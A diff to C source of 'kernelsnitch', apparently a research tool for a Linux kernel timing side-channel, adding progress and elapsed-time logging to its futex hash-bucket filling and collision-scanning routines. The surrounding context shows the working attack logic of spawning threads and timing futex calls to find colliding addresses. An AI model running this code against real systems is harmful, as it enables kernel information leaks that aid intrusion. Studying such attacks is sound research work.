@@ -99,6 +99,15 @@ struct kernelsnitch_shared_state {
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
+static inline unsigned long long ks_elapsed_ms(const struct timespec *start)
+{
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    long long seconds = (long long)now.tv_sec - (long long)start->tv_sec;
+    long long nanoseconds = (long long)now.tv_nsec - (long long)start->tv_nsec;
+    return (unsigned long long)(seconds * 1000 + nanoseconds / 1000000);
+}
+
 /**
  * FUTEX syscall
  */
@@ -134,14 +143,26 @@ static void *__do_increase(void *arg)
  */
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
+    struct timespec start;
+    clock_gettime(CLOCK_MONOTONIC, &start);
+    pr_info("[KS] collision bucket population begin requested=%zu\n", amount);
+    fflush(stdout);
     pthread_t tid;
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
         SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
+        if ((i + 1) % 1024 == 0) {
+            pr_info("[KS] collision bucket population progress created=%zu/%zu elapsed_ms=%llu\n",
+                    i + 1, amount, ks_elapsed_ms(&start));
+            fflush(stdout);
+        }
     }
     WAIT();
+    pr_info("[KS] collision bucket population complete created=%zu elapsed_ms=%llu\n",
+            amount, ks_elapsed_ms(&start));
+    fflush(stdout);
 }
 
 /**
@@ -307,11 +328,21 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     size_t wanted;
     size_t futex_addr;
     size_t id;
+    size_t scanned = 0;
+    struct timespec scan_start;
+    struct timespec measure_start;
     ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
+    clock_gettime(CLOCK_MONOTONIC, &scan_start);
+    pr_info("[KS] collision scan begin candidates=%zu wanted=%zu progress_interval=4096\n",
+            ks->total_futexes - 2, wanted);
+    fflush(stdout);
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    pr_info("[KS] collision scan baseline complete threshold=%zu elapsed_ms=%llu\n",
+            approx_time * KERNELSNITCH_THRESHOLD_MULT, ks_elapsed_ms(&scan_start));
+    fflush(stdout);
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -321,22 +352,39 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    clock_gettime(CLOCK_MONOTONIC, &measure_start);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
+        scanned++;
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
+        if ((i - 1) % 4096 == 0) {
+            pr_info("[KS] collision scan progress candidates=%zu/%zu collisions=%zu/%zu elapsed_ms=%llu total_elapsed_ms=%llu\n",
+                    scanned, ks->total_futexes - 2, count, wanted,
+                    ks_elapsed_ms(&measure_start), ks_elapsed_ms(&scan_start));
+            fflush(stdout);
+        }
     }
     if (wanted == count) {
+        pr_info("[KS] collision scan complete result=found collisions=%zu/%zu candidates=%zu/%zu elapsed_ms=%llu total_elapsed_ms=%llu\n",
+                count, wanted, scanned, ks->total_futexes - 2,
+                ks_elapsed_ms(&measure_start),
+                ks_elapsed_ms(&scan_start));
+        fflush(stdout);
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
+        pr_info("[KS] collision scan complete result=not_found collisions=%zu/%zu candidates=%zu/%zu elapsed_ms=%llu total_elapsed_ms=%llu\n",
+                count, wanted, scanned, ks->total_futexes - 2,
+                ks_elapsed_ms(&measure_start), ks_elapsed_ms(&scan_start));
+        fflush(stdout);
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
